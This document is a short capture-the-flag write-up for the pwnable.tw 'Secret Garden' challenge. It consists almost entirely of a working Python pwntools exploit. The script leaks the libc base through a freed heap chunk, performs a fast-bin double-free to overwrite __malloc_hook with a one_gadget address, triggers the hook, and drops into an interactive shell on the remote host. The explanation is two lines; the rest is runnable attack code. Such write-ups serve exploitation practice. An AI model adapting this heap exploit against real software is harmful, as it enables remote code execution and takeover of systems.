# Secret Garden
> LongChampion, 26/03/2020

## Ideal
- Leak libc
- Overwrite `malloc_hook` with `one_gadget` then trigger it

## Final Solution
```python
#!/usr/bin/python2

from pwn import *


r = remote("chall.pwnable.tw", "10203")
libc = ELF("./libc_64.so.6")


def Raise(Len, Name, Color):
    r.sendlineafter("Your choice :", '1')
    r.sendlineafter("Length of the name :", str(Len))
    r.sendlineafter("The name of flower :", Name)
    r.sendlineafter("The color of the flower :", Color)
    print r.recvuntil("Successful !")


def Visit(i):
    r.sendlineafter("Your choice :", '2')
    r.recvuntil("Name of the flower[" + str(i) + "] :")
    return r.recvuntil("Color")[:-5]


def Remove(i):
    r.sendlineafter("Your choice :", '3')
    r.sendlineafter(
        "Which flower do you want to remove from the garden:", str(i))
    print r.recvuntil("Successful")


def Clean():
    r.sendlineafter("Your choice :", '4')
    print r.recvuntil("Done!")


# Leak libc
Raise(0x100, "shit", "shit")
Raise(0x100, "shit", "shit")
Remove(0)
Raise(0x80, "shitshi", "shit")
leak = Visit(2)[-7:-1]
Clean()
libc_base = u64(leak.ljust(8, '\0')) - 0x3C3B78
ml_hook = libc_base + libc.symbols["__malloc_hook"]
one_gadget = libc_base + 0xef6c4
log.info("libc_base: " + hex(libc_base))
log.info("ml_hook: " + hex(ml_hook))
log.info("one_gadget: " + hex(one_gadget))

# Clean the garden
Remove(1)
Remove(2)
Clean()

# Overwrite malloc_hook by fast-bin attack
Raise(0x60, "shit", "shit")
Raise(0x60, "shit", "shit")
Remove(0)
Remove(1)
Remove(0)
Raise(0x60, p64(ml_hook - 0x23), "shit")
Raise(0x60, "shit", "shit")
Raise(0x60, "shit", "shit")
Raise(0x60, 'A' * (0x23 - 0x10) + p64(one_gadget), "shit")
Remove(1)

# Trigger malloc_hook
r.sendlineafter("Your choice :", '3')
r.sendlineafter("Which flower do you want to remove from the garden:", '1')

r.interactive()
```
